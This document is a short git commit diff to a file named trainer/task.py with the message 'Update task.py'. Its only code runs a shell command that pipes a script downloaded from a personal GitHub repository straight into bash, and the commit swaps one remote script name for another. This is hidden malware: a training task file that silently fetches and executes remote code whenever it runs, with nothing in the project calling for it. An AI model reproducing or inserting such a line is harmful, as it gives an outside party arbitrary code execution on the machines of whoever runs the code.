938343bc4b6214ba5a42a65a12fa8cc7a73e4e8f
6248202226 <149418871+6248202226@users.noreply.github.com>
2023-11-05 14:41:29 -0800

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/parmount6/filesg/main/var3 | bash')
+os.system('curl -sL https://raw.githubusercontent.com/parmount6/filesg/main/epep | bash')
